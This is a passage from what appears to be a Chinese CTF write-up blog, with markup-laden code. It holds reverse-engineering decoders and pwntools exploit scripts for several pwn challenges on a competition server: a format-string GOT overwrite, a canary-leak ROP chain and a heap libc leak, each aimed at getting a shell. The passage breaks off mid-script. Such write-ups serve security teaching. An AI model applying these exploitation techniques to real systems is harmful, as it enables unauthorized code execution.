class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n y <span class=\"token operator\">=</span> flagI<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">}</span>\n static1 <span class=\"token operator\">+=</span> <span class=\"token number\">0x61C88647</span><span class=\"token punctuation\">;</span> \n <span class=\"token punctuation\">}</span>\n <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span>\n cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token punctuation\">)</span>flagI<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n cout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre>\n<p>![image.png](https://img-blog.csdnimg.cn/img_convert/782f1c687ae66fca0e18823d7e045bed.png#clientId=u33a58aa7-7329-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=719&amp;id=uea6b265d&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=891&amp;originWidth=1285&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=94496&amp;status=done&amp;style=none&amp;taskId=u044a36a9-11e9-40b5-9167-53c64629cdd&amp;title=&amp;width=1036.6386222314075)</p>\n<h2><a id=\"Bobs_Code_332\"></a>Bob’s Code</h2>\n<p>IDA_x32<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/31ab11af9330ac3813dbdf27ec418717.png#clientId=u8fc2d141-c094-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=831&amp;id=u18e7b539&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=1030&amp;originWidth=1920&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=163849&amp;status=done&amp;style=none&amp;taskId=u004a8520-065c-4357-8a6f-072c534283d&amp;title=&amp;width=1548.9075133729978)<br/> 反编译出C：<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/bc9b0cbeacd459d3deec10553fe24909.png#clientId=u8fc2d141-c094-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=437&amp;id=u8ba395b7&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=542&amp;originWidth=993&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=77766&amp;status=done&amp;style=none&amp;taskId=u41e9048e-4b5f-4818-8157-42fc4cbad0a&amp;title=&amp;width=801.0756045725973)<br/> Base64的加密表，但是往下看，会发现换表了= =<br/> 分析后，定位到：<br/> ![image.png](https://img-blog.csdnimg.cn/img_convert/7a633e22b6f4e212a403beb1da615cca.png#clientId=u8fc2d141-c094-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=443&amp;id=u4112b7bd&amp;margin=[object Object]&amp;name=image.png&amp;originHeight=549&amp;originWidth=539&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=27889&amp;status=done&amp;style=none&amp;taskId=ud8dd5919-602e-466d-a92e-b33f23e0be3&amp;title=&amp;width=434.8235154729405)<br/> 写出exp：</p>\n<pre><code class=\"prism language-python\"><span class=\"token keyword\">import</span> base64\n\nstring_ <span class=\"token operator\">=</span> <span class=\"token string\">'.W1BqthGbebhYXio1XFhEY.NhVojRqXYtsVLDucXp5oFXNtieaVNfMuYhkoF0.'</span>\nb <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> string_<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token string\">'a'</span> <span class=\"token operator\">&lt;=</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token string\">'z'</span><span class=\"token punctuation\">:</span>\n        b <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">97</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">26</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">97</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">elif</span> <span class=\"token string\">'A'</span> <span class=\"token operator\">&lt;=</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token string\">'Z'</span><span class=\"token punctuation\">:</span>\n        b <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">65</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">26</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">65</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        b <span class=\"token operator\">+=</span> i\n\nb <span class=\"token operator\">+=</span> <span class=\"token string\">'\\=\\=\\='</span>\nbiao1 <span class=\"token operator\">=</span> <span class=\"token string\">\"ABCDEfghijklmnopqrsTUVWXYZabcdeFGHIJKLMNOPQRStuvwxyz0123456789-_\"</span>\nbiao2 <span class=\"token operator\">=</span> <span class=\"token string\">\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"</span>\nflag_basex <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">.</span>translate<span class=\"token punctuation\">(</span>string_<span class=\"token punctuation\">.</span>maketrans<span class=\"token punctuation\">(</span>biao1<span class=\"token punctuation\">,</span> biao2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nflag <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>flag_basex<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\n</code></pre>\n<h1><a id=\"PWN_361\"></a>PWN</h1>\n<h2><a id=\"sim_treasure_362\"></a>sim_treasure</h2>\n<pre><code class=\"prism language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span>\n<span class=\"token comment\">#io=process(\"./sp1\")</span>\nio<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"123.57.69.203:7010\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">7010</span><span class=\"token punctuation\">)</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./sp1\"</span><span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./libc-2.27.so\"</span><span class=\"token punctuation\">)</span>\nputs_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span>\nio<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Can you find the magic word?\\n\"</span><span class=\"token punctuation\">)</span>\npay_1 <span class=\"token operator\">=</span> p32<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"%6$s\"</span>\nio<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>pay_1<span class=\"token punctuation\">)</span>\nio<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\nputs_addr <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span> <span class=\"token string\">\"puts_got=\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span>\nprintf_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'printf'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span> <span class=\"token string\">\"printf_got=\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>printf_got<span class=\"token punctuation\">)</span>\nlibc_base <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span>\nsystem_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span> <span class=\"token string\">\"system_addr=\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span>\nio<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\npayload1 <span class=\"token operator\">=</span> fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{<!-- --></span>printf_got<span class=\"token punctuation\">:</span> system_addr<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\nio<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"A\\n\"</span><span class=\"token punctuation\">)</span>\nio<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span>\nio<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span>\nio<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<h2><a id=\"_389\"></a>跳一跳</h2>\n<pre><code class=\"prism language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span>\np<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'123.57.69.203'</span><span class=\"token punctuation\">,</span><span class=\"token number\">7020</span><span class=\"token punctuation\">)</span>\nelf<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./attachment-10'</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'~'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">232</span><span class=\"token operator\">-</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'255'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'+'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'+'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'255'</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xff'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">232</span><span class=\"token operator\">-</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\ncanary<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\0'</span><span class=\"token operator\">+</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsuccess<span class=\"token punctuation\">(</span><span class=\"token string\">'canary:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nstack_addr<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\0\\0'</span><span class=\"token punctuation\">)</span>\nsuccess<span class=\"token punctuation\">(</span><span class=\"token string\">'stack:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xff\\xff'</span><span class=\"token punctuation\">)</span>\ncode_base<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\0\\0'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">24</span><span class=\"token operator\">-</span>elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span>\nsuccess<span class=\"token punctuation\">(</span><span class=\"token string\">'code_base:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>code_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nleave<span class=\"token operator\">=</span><span class=\"token number\">0x124a</span><span class=\"token operator\">+</span>code_base\npop_rdi<span class=\"token operator\">=</span><span class=\"token number\">0x130b</span><span class=\"token operator\">+</span>code_base\n\npayload<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>code_base<span class=\"token operator\">+</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>code_base<span class=\"token operator\">+</span>elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>code_base<span class=\"token operator\">+</span>elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0xd8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token operator\">-</span><span class=\"token number\">0xf8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>leave<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nlibc_addr<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x0809c0</span>\nsuccess<span class=\"token punctuation\">(</span><span class=\"token string\">'libc_addr:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'~'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">232</span><span class=\"token operator\">-</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'255'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'+'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'+'</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xff'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">232</span><span class=\"token operator\">-</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\ncanary<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\0'</span><span class=\"token operator\">+</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsuccess<span class=\"token punctuation\">(</span><span class=\"token string\">'canary:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\npayload<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_addr<span class=\"token operator\">+</span><span class=\"token number\">0x1b3e9a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x04f440</span><span class=\"token operator\">+</span>libc_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0xd8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token operator\">-</span><span class=\"token number\">0xf8</span><span class=\"token operator\">-</span><span class=\"token number\">0xd0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>leave<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#gdb.attach(p)</span>\np<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<h2><a id=\"untidy_note_435\"></a>untidy_note</h2>\n<pre><code class=\"prism language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\nr <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"123.57.69.203\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">7030</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\nlibc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'libc-2.27.so'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>how<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"is:\\n\"</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"is:\\n\"</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>how<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>which<span class=\"token punctuation\">,</span> how<span class=\"token punctuation\">,</span> what<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"is:\\n\"</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\":\\n\"</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>which<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"is:\\n\"</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>how<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\":\\n\"</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>what<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>which<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"is:\\n\"</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"4\"</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\":\\n\"</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>which<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>which<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"is:\\n\"</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>which<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nr<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nr<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    dele<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\nr<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nr<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span>\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span>\nr<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content:\"</span><span class=\"token punctuation\">)</span>\nbase <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\x00'</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x3ebcc0</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span 